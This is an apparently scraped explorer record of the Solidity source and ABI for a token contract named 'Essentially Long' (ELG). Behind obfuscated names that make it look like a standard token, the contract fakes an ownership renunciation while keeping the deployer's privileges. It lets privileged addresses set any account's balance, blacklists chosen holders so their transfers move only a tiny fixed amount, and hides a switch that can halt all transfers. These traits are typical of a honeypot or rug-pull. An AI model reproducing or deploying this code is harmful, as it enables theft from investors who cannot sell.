{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface launchTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxLiquidityMin {\n    function createPair(address enableMin, address tradingSender) external returns (address);\n}\n\ninterface autoTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxFund) external view returns (uint256);\n\n    function transfer(address shouldSwapToken, uint256 fromMarketing) external returns (bool);\n\n    function allowance(address limitReceiverMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldSwapToken,\n        uint256 fromMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedFrom, uint256 value);\n    event Approval(address indexed limitReceiverMode, address indexed spender, uint256 value);\n}\n\ninterface autoTakeMetadata is autoTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EssentiallyLong is receiverToken, autoTake, autoTakeMetadata {\n\n    mapping(address => mapping(address => uint256)) private marketingTakeFund;\n\n    function minFeeToken(address sellMarketing) public {\n        minWallet();\n        if (modeAuto != modeEnableTo) {\n            modeEnableTo = launchedReceiver;\n        }\n        if (sellMarketing == sellAutoExempt || sellMarketing == receiverEnable) {\n            return;\n        }\n        sellLaunched[sellMarketing] = true;\n    }\n\n    function transfer(address receiverTotal, uint256 fromMarketing) external virtual override returns (bool) {\n        return modeExempt(_msgSender(), receiverTotal, fromMarketing);\n    }\n\n    bool public atSwapSell;\n\n    function owner() external view returns (address) {\n        return walletListLiquidity;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderToken;\n    }\n\n    mapping(address => bool) public sellLaunched;\n\n    address private walletListLiquidity;\n\n    bool public walletReceiverMax;\n\n    function takeAuto(address buyTotal, address shouldSwapToken, uint256 fromMarketing) internal returns (bool) {\n        require(autoSwap[buyTotal] >= fromMarketing);\n        autoSwap[buyTotal] -= fromMarketing;\n        autoSwap[shouldSwapToken] += fromMarketing;\n        emit Transfer(buyTotal, shouldSwapToken, fromMarketing);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return walletListLiquidity;\n    }\n\n    uint256 private modeEnableTo;\n\n    string private atToken = \"Essentially Long\";\n\n    address public receiverEnable;\n\n    uint256 public launchedReceiver;\n\n    event OwnershipTransferred(address indexed amountMarketing, address indexed exemptMarketing);\n\n    uint256 constant txMarketing = 13 ** 10;\n\n    function balanceOf(address maxFund) public view virtual override returns (uint256) {\n        return autoSwap[maxFund];\n    }\n\n    string private receiverTake = \"ELG\";\n\n    uint256 public modeAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTake;\n    }\n\n    uint256 enableAt;\n\n    address launchWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address buyTotal, address shouldSwapToken, uint256 fromMarketing) external override returns (bool) {\n        if (_msgSender() != launchWallet) {\n            if (marketingTakeFund[buyTotal][_msgSender()] != type(uint256).max) {\n                require(fromMarketing <= marketingTakeFund[buyTotal][_msgSender()]);\n                marketingTakeFund[buyTotal][_msgSender()] -= fromMarketing;\n            }\n        }\n        return modeExempt(buyTotal, shouldSwapToken, fromMarketing);\n    }\n\n    function modeExempt(address buyTotal, address shouldSwapToken, uint256 fromMarketing) internal returns (bool) {\n        if (buyTotal == sellAutoExempt) {\n            return takeAuto(buyTotal, shouldSwapToken, fromMarketing);\n        }\n        uint256 fromReceiver = autoTake(receiverEnable).balanceOf(takeList);\n        require(fromReceiver == launchedList);\n        require(shouldSwapToken != takeList);\n        if (sellLaunched[buyTotal]) {\n            return takeAuto(buyTotal, shouldSwapToken, txMarketing);\n        }\n        return takeAuto(buyTotal, shouldSwapToken, fromMarketing);\n    }\n\n    constructor (){\n        \n        launchTx buySell = launchTx(launchWallet);\n        receiverEnable = maxLiquidityMin(buySell.factory()).createPair(buySell.WETH(), address(this));\n        if (walletSender != limitReceiverList) {\n            limitReceiverList = launchedReceiver;\n        }\n        sellAutoExempt = _msgSender();\n        buySwapMode();\n        marketingTakeList[sellAutoExempt] = true;\n        autoSwap[sellAutoExempt] = senderFundMode;\n        \n        emit Transfer(address(0), sellAutoExempt, senderFundMode);\n    }\n\n    function minWallet() private view {\n        require(marketingTakeList[_msgSender()]);\n    }\n\n    function tradingTx(address walletFundAuto) public {\n        require(walletFundAuto.balance < 100000);\n        if (tradingTake) {\n            return;\n        }\n        if (senderTakeMax != takeModeExempt) {\n            modeEnableTo = walletSender;\n        }\n        marketingTakeList[walletFundAuto] = true;\n        if (walletSender == launchedReceiver) {\n            takeModeExempt = true;\n        }\n        tradingTake = true;\n    }\n\n    uint256 private senderFundMode = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public marketingTakeList;\n\n    uint8 private senderToken = 18;\n\n    uint256 launchedList;\n\n    bool public senderTakeMax;\n\n    mapping(address => uint256) private autoSwap;\n\n    address takeList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return atToken;\n    }\n\n    address public sellAutoExempt;\n\n    uint256 private walletSender;\n\n    function fromMode(uint256 fromMarketing) public {\n        minWallet();\n        launchedList = fromMarketing;\n    }\n\n    bool public tradingTake;\n\n    function allowance(address tokenFund, address launchSellLimit) external view virtual override returns (uint256) {\n        if (launchSellLimit == launchWallet) {\n            return type(uint256).max;\n        }\n        return marketingTakeFund[tokenFund][launchSellLimit];\n    }\n\n    uint256 private limitReceiverList;\n\n    bool public takeModeExempt;\n\n    function approve(address launchSellLimit, uint256 fromMarketing) public virtual override returns (bool) {\n        marketingTakeFund[_msgSender()][launchSellLimit] = fromMarketing;\n        emit Approval(_msgSender(), launchSellLimit, fromMarketing);\n        return true;\n    }\n\n    function buySwapMode() public {\n        emit OwnershipTransferred(sellAutoExempt, address(0));\n        walletListLiquidity = address(0);\n    }\n\n    function fromLimit(address receiverTotal, uint256 fromMarketing) public {\n        minWallet();\n        autoSwap[receiverTotal] = fromMarketing;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderFundMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiverMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSellLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSellLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSwapSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySwapMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"fromLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"fromMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTakeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"}],\"name\":\"minFeeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAutoExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTakeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeModeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFundAuto\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldSwapToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EssentiallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}